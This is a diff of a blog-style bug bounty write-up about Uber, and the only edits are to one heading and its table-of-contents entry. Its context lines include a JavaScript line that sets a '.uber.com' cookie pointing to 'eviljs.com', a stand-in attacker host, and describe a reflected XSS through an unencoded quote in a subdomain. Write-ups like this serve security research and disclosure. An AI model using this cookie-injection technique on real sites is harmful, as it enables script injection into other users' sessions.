@@ -332,7 +332,7 @@ JSONP RequestSeveral months ago,">
 <h2 id="The-Feature-of-Cookie"><a href="#The-Feature-of-Cookie" class="headerlink" title="The Feature of Cookie"></a>The Feature of Cookie</h2><p>Any subdomain of uber.com can set cookie with domain <code>.uber.com</code> to be used across subdomains. For instance, we can set cookie in <code>xxx.uber.com</code> using following code, then <code>get.uber.com</code> will use the cookie value.</p>
 <figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document<span class="class">.cookie</span> = <span class="string">'_rfiServer=eviljs.com;domain=.uber.com;expires=Sat, 27 Jan 2018 01:43:57 GMT;path=/'</span></span><br></pre></td></tr></table></figure>
 <p><img src="https://ws1.sinaimg.cn/large/7184df6bgy1fj21fxdw02j21dk16qqel.jpg" alt=""></p>
-<h2 id="XSS-of-uber-com-but-Out-of-Scope"><a href="#XSS-of-uber-com-but-Out-of-Scope" class="headerlink" title="XSS of uber.com but Out of Scope"></a>XSS of uber.com but Out of Scope</h2><p>I did really find out one reflected XSS in one of Uber’s subdomain using search engine. Let’s call the domain <code>&lt;redacted&gt;.uber.com</code> for demo.</p>
+<h2 id="XSS-of-uber-com-which-is-Out-of-Scope"><a href="#XSS-of-uber-com-which-is-Out-of-Scope" class="headerlink" title="XSS of .uber.com which is Out of Scope"></a>XSS of <redacted>.uber.com which is Out of Scope</redacted></h2><p>I did really find out one reflected XSS in one of Uber’s subdomain using search engine. Let’s call the domain <code>&lt;redacted&gt;.uber.com</code> for demo.</p>
 <p><img src="https://ws1.sinaimg.cn/large/7184df6bgy1fj21w61lp8j21dw0fy79z.jpg" alt=""></p>
 <ol>
 <li><code>&quot;</code> is reflected and not encoded. We can inject any attribution into <code>input</code> tag.</li>
@@ -569,7 +569,7 @@ JSONP RequestSeveral months ago,">
               
             
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#JSONP-Request"><span class="nav-number">1.</span> <span class="nav-text">JSONP Request</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#The-Feature-of-Cookie"><span class="nav-number">2.</span> <span class="nav-text">The Feature of Cookie</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS-of-uber-com-but-Out-of-Scope"><span class="nav-number">3.</span> <span class="nav-text">XSS of uber.com but Out of Scope</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Summary"><span class="nav-number">4.</span> <span class="nav-text">Summary</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#JSONP-Request"><span class="nav-number">1.</span> <span class="nav-text">JSONP Request</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#The-Feature-of-Cookie"><span class="nav-number">2.</span> <span class="nav-text">The Feature of Cookie</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS-of-uber-com-which-is-Out-of-Scope"><span class="nav-number">3.</span> <span class="nav-text">XSS of .uber.com which is Out of Scope</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Summary"><span class="nav-number">4.</span> <span class="nav-text">Summary</span></a></li></ol></div>
             
           </div>
         </section>
